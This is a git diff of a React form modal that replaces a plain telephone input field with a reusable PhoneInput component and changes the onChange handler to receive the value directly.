@@ -2,6 +2,7 @@ import { useState } from 'react';
 import PropTypes from 'prop-types';
 import TickIcon from '@/assets/images/tick.svg';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
+import PhoneInput from '@/components/phone-input';
 
 const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
     const [formData, setFormData] = useState({
@@ -113,17 +114,12 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
                                 <label className="form-label" htmlFor="PhoneFirld">
                                     {texts.mobilePhone || 'Mobile Phone Number'}
                                 </label>
-                                <input
-                                    aria-describedby="emailHelp"
-                                    className={`form-control ${errors.phone ? 'is-invalid' : ''}`}
+                                <PhoneInput
+                                    error={errors.phone}
                                     id="PhoneFirld"
-                                    maxLength="18"
-                                    minLength="7"
                                     name="mobile-phone-number"
-                                    required
-                                    type="tel"
                                     value={formData.phone}
-                                    onChange={(e) => handleChange('phone', e.target.value)}
+                                    onChange={(val) => handleChange('phone', val)}
                                 />
                             </div>
                             <div className="mb-3">
